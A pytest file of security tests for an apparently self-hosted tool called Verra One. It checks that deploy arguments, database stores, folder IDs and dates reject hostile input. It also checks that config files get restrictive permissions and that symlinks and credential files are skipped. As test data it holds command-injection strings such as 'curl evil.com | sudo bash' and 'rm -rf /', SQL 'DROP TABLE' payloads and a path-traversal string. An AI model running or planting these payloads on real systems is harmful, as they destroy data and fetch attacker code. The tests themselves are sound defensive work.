"""Security-focused unit tests for Verra One.

Tests the hardening fixes applied across the codebase:
  - Shell injection prevention in deploy
  - File permission enforcement on tokens/config
  - Path traversal prevention in folder ingestion
  - Input validation (dates, folder IDs, etc.)
  - Credential pattern detection
  - SQL injection resistance
"""

from __future__ import annotations

import hashlib
import os
import sqlite3
import stat
import tempfile
from pathlib import Path

import pytest
import sys

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))


# ---------------------------------------------------------------------------
# Deploy: shell injection prevention
# ---------------------------------------------------------------------------


class TestDeployValidation:
    def test_rejects_model_with_semicolon(self):
        from verra.deploy.ssh import _validate_shell_arg
        with pytest.raises(ValueError, match="Invalid model"):
            _validate_shell_arg("llama3; rm -rf /", "model")

    def test_rejects_model_with_pipe(self):
        from verra.deploy.ssh import _validate_shell_arg
        with pytest.raises(ValueError, match="Invalid model"):
            _validate_shell_arg("llama3 | curl evil.com", "model")

    def test_rejects_model_with_backtick(self):
        from verra.deploy.ssh import _validate_shell_arg
        with pytest.raises(ValueError, match="Invalid model"):
            _validate_shell_arg("llama3`whoami`", "model")

    def test_rejects_user_with_injection(self):
        from verra.deploy.ssh import _validate_shell_arg
        with pytest.raises(ValueError, match="Invalid user"):
            _validate_shell_arg("ubuntu; curl evil.com | sudo bash", "user")

    def test_allows_valid_model_names(self):
        from verra.deploy.ssh import _validate_shell_arg
        for name in ["llama3.2", "mistral", "ollama/llama3:latest", "custom-model/v2.1"]:
            assert _validate_shell_arg(name, "model") == name

    def test_allows_valid_usernames(self):
        from verra.deploy.ssh import _validate_shell_arg
        for name in ["ubuntu", "root", "deploy-user", "user_name", "ec2-user"]:
            assert _validate_shell_arg(name, "user") == name

    def test_rejects_empty_input(self):
        from verra.deploy.ssh import _validate_shell_arg
        with pytest.raises(ValueError):
            _validate_shell_arg("", "model")

    def test_rejects_newline(self):
        from verra.deploy.ssh import _validate_shell_arg
        with pytest.raises(ValueError):
            _validate_shell_arg("llama3\nrm -rf /", "model")


# ---------------------------------------------------------------------------
# File permissions
# ---------------------------------------------------------------------------


class TestFilePermissions:
    def test_config_save_permissions(self):
        from verra.config import save_config, VerraConfig
        with tempfile.TemporaryDirectory() as tmpdir:
            config_path = Path(tmpdir) / "config.yaml"
            save_config(VerraConfig(), path=config_path)
            mode = config_path.stat().st_mode
            assert mode & stat.S_IRUSR, "Config should be owner-readable"
            assert mode & stat.S_IWUSR, "Config should be owner-writable"
            assert not (mode & stat.S_IROTH), "Config should not be world-readable"
            assert not (mode & stat.S_IRGRP), "Config should not be group-readable"

    def test_config_save_atomic(self):
        from verra.config import save_config, load_config, VerraConfig
        with tempfile.TemporaryDirectory() as tmpdir:
            config_path = Path(tmpdir) / "config.yaml"
            cfg = VerraConfig()
            cfg.agent.name = "test-agent"
            save_config(cfg, path=config_path)
            loaded = load_config(path=config_path)
            assert loaded.agent.name == "test-agent"
            tmp_path = config_path.with_suffix(".yaml.tmp")
            assert not tmp_path.exists(), "Temp file should be cleaned up"


# ---------------------------------------------------------------------------
# Path traversal prevention
# ---------------------------------------------------------------------------


class TestPathTraversal:
    def test_skips_symlinked_files(self):
        from verra.ingest.folder import crawl_folder
        with tempfile.TemporaryDirectory() as tmpdir:
            root = Path(tmpdir)
            (root / "real.txt").write_text("real content")
            link = root / "evil.txt"
            try:
                link.symlink_to("/etc/hosts")
            except OSError:
                pytest.skip("Cannot create symlinks")
            files = list(crawl_folder(root))
            names = [f.name for f, _ in files]
            assert "real.txt" in names
            assert "evil.txt" not in names

    def test_skips_symlinked_directories(self):
        from verra.ingest.folder import crawl_folder
        with tempfile.TemporaryDirectory() as tmpdir:
            root = Path(tmpdir)
            (root / "real_dir").mkdir()
            (root / "real_dir" / "doc.txt").write_text("content")
            try:
                (root / "evil_dir").symlink_to("/tmp")
            except OSError:
                pytest.skip("Cannot create symlinks")
            files = list(crawl_folder(root))
            paths = [str(f) for f, _ in files]
            assert not any("/tmp/" in p for p in paths)


# ---------------------------------------------------------------------------
# Credential detection
# ---------------------------------------------------------------------------


class TestCredentialDetection:
    def test_detects_common_credential_files(self):
        from verra.ingest.folder import is_credential_file
        should_detect = [
            "credentials.json", "client_secret.json", "service_account.json",
            ".env", "api-key.txt", "id_rsa", "id_ed25519", "private-key.pem",
            "server.key", "token.json", "my_password.txt", "cert.pfx", "keystore.p12",
        ]
        for fname in should_detect:
            assert is_credential_file(Path(fname)), f"Should detect {fname}"

    def test_allows_normal_files(self):
        from verra.ingest.folder import is_credential_file
        should_allow = ["report.pdf", "meeting_notes.docx", "budget.xlsx", "readme.md", "data.csv"]
        for fname in should_allow:
            assert not is_credential_file(Path(fname)), f"Should allow {fname}"


# ---------------------------------------------------------------------------
# SQL injection resistance
# ---------------------------------------------------------------------------


class TestSQLInjection:
    def _make_db(self):
        from verra.store.db import DatabaseManager
        dm = DatabaseManager.__new__(DatabaseManager)
        dm.data_dir = Path("/tmp/fake")
        conn = sqlite3.connect(":memory:", check_same_thread=False)
        conn.row_factory = sqlite3.Row
        dm.core = conn
        dm.analysis = sqlite3.connect(":memory:", check_same_thread=False)
        dm.analysis.row_factory = sqlite3.Row
        dm.core.execute("PRAGMA journal_mode=WAL")
        dm.core.execute("PRAGMA foreign_keys=ON")
        dm.analysis.execute("PRAGMA journal_mode=WAL")
        dm.analysis.execute("PRAGMA foreign_keys=ON")
        dm._init_core_tables()
        dm._init_analysis_tables()
        return dm

    def test_metadata_store_injection(self):
        from verra.store.metadata import MetadataStore
        dm = self._make_db()
        store = MetadataStore.from_connection(dm.core)
        evil = "'; DROP TABLE documents; --"
        doc_id = store.add_document(
            file_path=evil, file_name=evil, source_type=evil, format="pdf",
            content_hash=hashlib.sha256(evil.encode()).hexdigest(),
        )
        assert doc_id > 0
        count = dm.core.execute("SELECT COUNT(*) FROM documents").fetchone()[0]
        assert count == 1
        row = dm.core.execute("SELECT file_name FROM documents WHERE id = ?", (doc_id,)).fetchone()
        assert row["file_name"] == evil
        dm.close()

    def test_entity_store_injection(self):
        from verra.store.entities import EntityStore
        dm = self._make_db()
        store = EntityStore.from_connection(dm.core)
        evil = "Robert'); DROP TABLE entities; --"
        eid = store.add_entity(evil, "person")
        assert eid > 0
        count = dm.core.execute("SELECT COUNT(*) FROM entities").fetchone()[0]
        assert count == 1
        dm.close()

    def test_memory_store_injection(self):
        from verra.store.memory import MemoryStore
        dm = self._make_db()
        store = MemoryStore.from_connection(dm.core)
        evil = "value'); DELETE FROM memory; --"
        store.set_memory("test", "key", evil)
        count = dm.core.execute("SELECT COUNT(*) FROM memory").fetchone()[0]
        assert count == 1
        dm.close()


# ---------------------------------------------------------------------------
# Drive folder ID validation
# ---------------------------------------------------------------------------


class TestDriveValidation:
    def test_rejects_injection_in_folder_id(self):
        import re
        pattern = re.compile(r"[a-zA-Z0-9_-]{10,60}")
        for fid in ["' OR 1=1 --", "short", "../../../etc/passwd"]:
            assert not pattern.fullmatch(fid), f"Should reject: {fid}"
        for fid in ["1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgVE2upms", "0B1234567890abcdefghij"]:
            assert pattern.fullmatch(fid), f"Should accept: {fid}"


# ---------------------------------------------------------------------------
# Date validation
# ---------------------------------------------------------------------------


class TestDateValidation:
    def test_outlook_since_validation(self):
        import re
        pattern = re.compile(r"\d{4}-\d{2}-\d{2}")
        for d in ["2024-01-01", "2025-12-31"]:
            assert pattern.fullmatch(d), f"Should accept: {d}"
        for d in ["yesterday", "2024-1-1", "' OR 1=1", "2024-01-01T00:00:00Z"]:
            assert not pattern.fullmatch(d), f"Should reject: {d}"
